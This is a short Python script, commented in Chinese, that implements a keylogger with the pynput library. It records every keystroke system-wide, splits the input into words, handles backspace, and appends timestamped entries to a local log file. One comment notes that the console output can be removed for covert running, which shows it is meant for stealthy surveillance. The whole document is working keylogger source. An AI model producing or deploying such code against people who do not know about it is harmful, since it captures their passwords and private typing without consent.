import os
import time
from pynput import keyboard

# 日志配置文件路径
LOG_FILE = "key_log.txt"

# 全局缓冲区
current_word = []
last_key_time = time.time()
TIMEOUT_THRESHOLD = 3.0  # 超过 3 秒不打字，自动切分单词

def save_word_to_file():
    """将缓冲区内的单词写入文件，并清空缓冲区"""
    global current_word
    if current_word:
        word_str = "".join(current_word)
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        
        # 格式化写入：[时间戳] 单词内容
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {word_str}\n")
            
        print(f"[日志已保存]: {word_str}") # 测试时打印，隐蔽运行时可删除
        current_word.clear()

def on_press(key):
    global current_word, last_key_time
    
    current_time = time.time()
    # 智能切分：如果距离上次敲击键盘超过了阈值时间，先保存上一段
    if current_time - last_key_time > TIMEOUT_THRESHOLD and current_word:
        save_word_to_file()
    last_key_time = current_time

    try:
        # 1. 处理普通可见字符 (a-z, 0-9, 标点等)
        current_word.append(key.char)
    except AttributeError:
        # 2. 处理不可见/功能按键
        if key == keyboard.Key.space:
            # 按了空格，说明当前单词结束了
            current_word.append(" ")
            save_word_to_file()
            
        elif key == keyboard.Key.enter:
            # 按了回车，换行并保存
            current_word.append(" [ENTER]")
            save_word_to_file()
            
        elif key == keyboard.Key.backspace:
            # 用户按了退格键，删除缓冲区最后一个字符（模拟真实的输入修正）
            if current_word:
                current_word.pop()
                
        elif key in [keyboard.Key.tab, keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            # 其他你可能想记录的功能键可以单独处理
            pass

def on_release(key):
    # 按 ESC 键退出并强制刷新缓冲区
    if key == keyboard.Key.esc:
        save_word_to_file()
        print("[*] 正在安全退出...")
        return False

def main():
    print(f"[*] 格式化日志记录器已启动。数据将保存至: {os.path.abspath(LOG_FILE)}")
    print("[*] 正在监听键盘...（按 ESC 键退出）\n" + "-"*50)
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
